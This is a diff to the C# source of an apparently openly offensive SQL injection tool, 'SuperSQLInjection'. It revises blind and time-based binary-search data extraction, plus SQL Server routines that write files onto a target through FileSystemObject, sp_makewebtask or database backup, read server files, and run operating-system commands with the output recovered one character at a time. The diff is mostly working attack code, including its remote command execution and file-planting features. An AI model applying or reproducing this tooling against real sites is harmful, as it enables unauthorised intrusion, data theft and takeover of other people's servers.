@@ -286,7 +286,7 @@ namespace SuperSQLInjection
             responseStream.Close();
         }
 
-        public static int version = 20190903;
+        public static int version = 20190905;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(Tools.getSystemSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -2704,71 +2704,52 @@ namespace SuperSQLInjection
         /// <returns></returns>
         public int getValue(String payLoadStr, int start, int end)
         {
-            int len = 0;
+            int mid = 0;
             String payload = "";
-            int min = start;
-            int olen = 0;
             Boolean lastexists = false;
-            while (status == 1)
+            while (start <= end)
             {
                 //2分法获取中间数字
-                len = Tools.getLargeNum(start, end);
+                mid = Tools.getLargeNum(start, end);
 
-                payload = ByPassForBetween(payLoadStr, len);
+                payload = ByPassForBetween(payLoadStr, mid);
                 ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                 Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
 
-                if (end - start == 1)
-                {
-                    if (!lastexists && exists)
-                    {
-                        return end;
-                    }
-                    else if (lastexists && !exists)
-                    {
-                        return start;
-                    }
-                }
-                if (len == start)
+                if (end == start)
                 {
                     if (exists)
                     {
-                        return end;
+                        return end+1;
                     }
                     else
                     {
-                        return start;
+
+                        return end;
+
                     }
-
                 }
-
-                olen = len;
-                lastexists = exists;
                 if (exists)
                 {
-
-                    start = len;
+                    start = mid + 1; // 左侧的不要了
                 }
                 else
                 {
-                    end = len;
+                    end = mid - 1; // 右侧的不要了
                 }
 
             }
-            return len;
+            return end+1;
         }
 
         public int getOrderByColumns(String payLoadStr, int start, int end)
         {
-            int len = 0;
+            int mid = 0;
             String payload = "";
-            int min = start;
-            int olen = 0;
             //最小1是否报错，最大1000是否报错
             payload = ByPassForBetween(payLoadStr, 1);
             ServerInfo server_1 = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
             Boolean use_error = false;
-            Boolean lastexists = false;
             payload = ByPassForBetween(payLoadStr, 1000);
             ServerInfo server_1000 = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
 
@@ -2776,20 +2757,12 @@ namespace SuperSQLInjection
             {
                 use_error = true;
             }
-
-            while (status == 1)
+            while (start<=end)
             {
                 //2分法获取中间数字
-                len = Tools.getLargeNum(start, end);
-                if (end - start == 1)
-                {
-                    if (lastexists)
-                    {
-                        return end;
-                    }
-                    return start;
-                }
-                payload = ByPassForBetween(payLoadStr, len);
+                mid = Tools.getLargeNum(start, end);
+                
+                payload = ByPassForBetween(payLoadStr, mid);
                 ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                 Boolean exists = false;
                 if (use_error)
@@ -2803,20 +2776,28 @@ namespace SuperSQLInjection
                 {
                     exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
                 }
-
-                olen = len;
-                lastexists = exists;
-
+                if (end==start)
+                {
+                    if (exists)
+                    {
+                        return end;
+                    }
+                    else {
+                        
+                         return end-1;
+ 
+                    }
+                }
                 if (exists)
                 {
-                    start = len;
+                    start = mid+1; // 左侧的不要了
                 }
                 else
                 {
-                    end = len;
+                    end = mid-1; // 右侧的不要了
                 }
             }
-            return len;
+            return end;
         }
 
         /// <summary>
@@ -6064,7 +6045,8 @@ namespace SuperSQLInjection
                 ListViewItem lvi = new ListViewItem();
                 String result = getOneDataByUnionOrError(SQLServer.getErrorDataValue(gp.dbname, gp.table, gp.limit, gp.columns));
                 result = HttpUtility.HtmlDecode(result);
-                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
+                //数结果改成xml格式，单独解析
+                addItemToListViewBySQLServerXMLData(result, gp.columns);
                 this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
             }
             catch (Exception e)
@@ -8416,9 +8398,9 @@ namespace SuperSQLInjection
             this.file_txt_result.AppendText(text + "\r\n");
         }
 
-        public void cmd_txt_resultSetText(String text)
+        public void cmd_txt_resultAppendText(String text)
         {
-            this.cmd_txt_result.Text = text;
+            this.cmd_txt_result.AppendText(text);
         }
 
         public void readOrWriteFile()
@@ -8476,7 +8458,7 @@ namespace SuperSQLInjection
                                         value = Tools.unHex(Tools.convertToString(ver_tmp), config.readFileEncoding);
                                     }
                                     this.Invoke(new StringDelegate(file_txt_resultSetText), value);
-                                    this.txt_log.Invoke(new showLogDelegate(log), this.file_cbox_readWrite.Text + "完成！", LogLevel.success);
+                                    this.txt_log.Invoke(new showLogDelegate(log), "读文件完成！", LogLevel.success);
 
                                 }
                                 catch (Exception e)
@@ -8581,6 +8563,10 @@ namespace SuperSQLInjection
                         if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                         {
                             String payload = SQLServer.witeFileByFileSystemObject.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
+                            if (config.keyType.Equals(KeyType.Time))
+                            {
+                                payload = payload.Replace(" 1=1;", ";");
+                            }
                             HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                         }
@@ -8596,6 +8582,10 @@ namespace SuperSQLInjection
                         if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                         {
                             String payload = SQLServer.witeFileBySP_MakeWebTask.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
+                            if (config.keyType.Equals(KeyType.Time))
+                            {
+                                payload = payload.Replace(" 1=1;", ";");
+                            }
                             HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                         }
@@ -8610,17 +8600,31 @@ namespace SuperSQLInjection
                         //backup database写文件
                         if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                         {
+
                             String payload = SQLServer.witeFileByBackDataBase.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
+                            String dropWriteFileBackUpTableAndDropDB = SQLServer.dropWriteFileBackUpTableAndDropDB;
+                            String createWriteFileBackUpDB = SQLServer.createWriteFileBackUpDB;
+                            String createWriteFileBackUpTable = SQLServer.createWriteFileBackUpTable;
+                            if (config.keyType.Equals(KeyType.Time))
+                            {
+                                payload = payload.Replace(" 1=1;", ";");
+                                dropWriteFileBackUpTableAndDropDB = dropWriteFileBackUpTableAndDropDB.Replace(" 1=1;", ";");
+                                createWriteFileBackUpDB = createWriteFileBackUpDB.Replace(" 1=1;", ";");
+                                createWriteFileBackUpTable = createWriteFileBackUpTable.Replace(" 1=1;", ";");
+                                dropWriteFileBackUpTableAndDropDB = dropWriteFileBackUpTableAndDropDB.Replace(" 1=1;", ";");
+                            }
+                            
+                            
                             //删库删表
-                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             //建库建表
-                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.createWriteFileBackUpDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.createWriteFileBackUpTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, createWriteFileBackUpDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, createWriteFileBackUpTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
 
                             //执行备份写
                             HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             //删库删表
-                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                         }
                         else
@@ -8633,7 +8637,14 @@ namespace SuperSQLInjection
                     {
                         //filesystemobject读文件
                         String payload = SQLServer.readFileByFileSystemobject.Replace("{path}", path);
-                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                        String dropTable = SQLServer.dropTable;
+                        if (config.keyType.Equals(KeyType.Time))
+                        {
+                            payload= payload.Replace(" 1=1;", ";");
+                            dropTable = dropTable.Replace(" 1=1;", ";");
+                        }
+
+                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                         HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                         switch (config.injectType)
                         {
@@ -8947,6 +8958,7 @@ namespace SuperSQLInjection
                     value += Tools.unHexByUnicode(eunicode, config.readFileEncoding);
                 }
                 ver_tmp[int.Parse(index.ToString()) - 1] = value;
+                this.txt_log.Invoke(new showLogDelegate(log), "获取到读取的文件内容:" + Tools.StringArrayToString(ver_tmp), LogLevel.info);
                 m_index++;
 
             }
@@ -9028,44 +9040,59 @@ namespace SuperSQLInjection
 
         public void execCMDBySQLServerByUnicode(Object param)
         {
-
             String[] ps = param.ToString().Split('#');
             int index = int.Parse(ps[1]);
 
-            int len = 0;
-            if (KeyType.Time.Equals(config.keyType))
+            //取值payload，替换对应下标值
+            String unicode_data_payload = SQLServer.unicode_value.Replace("{index}", index + "").Replace("{data}", ps[0]);
+            //取unicode转换后的长度
+            String unicode_data_len_payload = SQLServer.bool_length.Replace("{data}", unicode_data_payload);
+            int unicode_data_len = 0;
+            if (config.keyType.Equals(KeyType.Time))
             {
-                len = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", ps[0]), config.maxTime), 0, 8);
+                unicode_data_len = getValue(SQLServer.getBoolDataBySleep(unicode_data_len_payload, config.maxTime), 1, 8);
             }
             else
             {
-                len = getValue(SQLServer.bool_length.Replace("{data}", ps[0]), 0, 8);
+                unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
             }
 
+            //长度范围2-8支持大部分语言
 
-            int cindex = 1;
-            String temUnicode = "";
-            while (cindex <= len)
+            int m_index = 1;
+            StringBuilder unicodes = new StringBuilder();
+
+            String value = "";
+
+            while (m_index <= unicode_data_len)
             {
-                String tmp_payload = SQLServer.bool_value.Replace("{data}", SQLServer.substr.Replace("{data}", ps[0]).Replace("{index}", cindex + ""));
-                //数字加大写字母的ascii码
-                int ascii = 0;
-                if (KeyType.Time.Equals(config.keyType))
+                //获取多字节
+                String substr_payload = SQLServer.bool_value.Replace("{data}", SQLServer.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString()));
+                //单个unicode值范围是0-9
+                int unicode = 0;
+                if (config.keyType.Equals(KeyType.Time))
                 {
-                    ascii = getValue(SQLServer.getBoolDataBySleep(tmp_payload, config.maxTime), 0, 9);
+                    unicode = getValue(SQLServer.getBoolDataBySleep(substr_payload, config.maxTime), 0, 9);
                 }
                 else
                 {
-                    ascii = getValue(tmp_payload, 0, 9);
+                    unicode = getValue(substr_payload, 0, 9);
                 }
 
-                temUnicode += ascii.ToString();
-                cindex++;
+                unicodes.Append(unicode.ToString());
+                m_index++;
             }
-            int unicode = Tools.convertToInt(temUnicode);
-
-            ver_tmp[index - 1] = Tools.unHexByUnicode(unicode, "UTF-8");
-            this.txt_log.Invoke(new showLogDelegate(log), "获取到CMD执行结果--" + ver_tmp[index - 1], LogLevel.info);
+            int rstr = int.Parse(unicodes.ToString());
+            if (rstr <= 255)
+            {
+                value += (char)rstr;
+            }
+            else
+            {
+                value += Tools.unHexByUnicode(rstr, config.readFileEncoding);
+            }
+            ver_tmp[index - 1] = value;
+            this.txt_log.Invoke(new showLogDelegate(log), "获取到CMD执行结果：" + HttpUtility.HtmlDecode(Tools.StringArrayToString(ver_tmp)), LogLevel.info);
             Interlocked.Increment(ref this.currentDataCount);
         }
 
@@ -9082,6 +9109,13 @@ namespace SuperSQLInjection
                 String cmd_16 = Tools.strToHex(cmd, "GB2312");
                 //执行cmd
                 String cmd_data_payload = SQLServer.createTableAndExecCmd.Replace("{cmd}", cmd_16);
+                String dropTable = SQLServer.dropTable;
+                if (config.keyType.Equals(KeyType.Time))
+                {
+                    cmd_data_payload = cmd_data_payload.Replace(" 1=1;", ";");
+                    dropTable= dropTable.Replace(" 1=1;", ";");
+                }
+
                 //修正payload
                 int ssindex = config.request.IndexOf("<Encode>");
                 int seindex = config.request.IndexOf("</Encode>");
@@ -9092,7 +9126,7 @@ namespace SuperSQLInjection
                 }
                 //修正payload
                 //String cmdrequest = Regex.Replace(config.request, "\\<Encode\\>(.*?)\\<\\/Encode\\>", "<Encode>#inject#</Encode>");
-                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                 HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cmd_data_payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                 this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，CMD命令执行完成，正在等待获取执行结果！", LogLevel.info);
                 if (config.showCmdResult)
@@ -9138,8 +9172,7 @@ namespace SuperSQLInjection
                                     //获取值
                                     for (int j = 1; j <= len; j++)
                                     {
-                                        String dtmp_payload = PostgreSQL.bool_value.Replace("{data}", data_payload).Replace("{index}", j + "");
-                                        stp.QueueWorkItem<string>(execCMDBySQLServerByUnicode, dtmp_payload + "#" + j);
+                                        stp.QueueWorkItem<string>(execCMDBySQLServerByUnicode, data_payload + "#" + j);
                                         stp.WaitFor(100);
 
                                     }
